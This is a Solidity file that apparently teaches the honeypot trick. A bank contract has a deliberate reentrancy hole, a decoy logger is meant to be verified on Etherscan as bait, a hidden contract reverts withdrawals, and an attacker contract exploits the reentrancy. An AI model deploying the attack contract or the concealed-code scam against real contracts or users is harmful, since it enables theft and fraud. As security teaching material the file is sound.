pragma solidity ^0.6.10;

contract Bank {
    mapping (address => uint) public balances;
    // by giving different address of contract with same interface, we can hide code
    Logger logger;

    constructor(Logger _logger) public {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

// the contract code will be displayed in etherscan to be a bait
contract Logger {
    event Log(address caller, uint amount, string action);

    function log(address _caller, uint _amount, string memory _action) public {
        emit Log(_caller, _amount, _action);
    }
}

contract HoneyPot {

    // same function signature with the bait function
    function log(address _caller, uint _amount, string memory _action) public {
        // revert whole transaction, haha
        if (equal(_action, "Withdraw")) {
            revert("it's trap");
        }
    }

    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}

contract AttackHoneyPot {
    Bank bank;

    constructor(Bank _bank) public {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
}